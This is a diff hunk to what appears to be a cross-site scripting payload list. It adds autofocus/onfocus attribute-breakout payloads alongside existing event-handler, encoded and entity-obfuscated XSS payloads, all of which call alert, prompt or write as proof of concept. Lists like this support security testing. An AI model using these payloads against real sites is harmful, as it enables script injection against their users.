@@ -15,6 +15,9 @@
 <details/open/ontoggle=write(1)//
 <brinhosa onclick=confirm()>click
 <brinhosa/="/prompt(1)/"<
+"autofocus ' onfocus='alert(document.domain)'
+"autofocus onfocus='alert(document.domain)'
+"test ' ontest='a' 
 <svg onload=write(7)>
 "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
 <img/src="x"/onerror=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;&#x28;&#x31;&#x29;&#xA; <
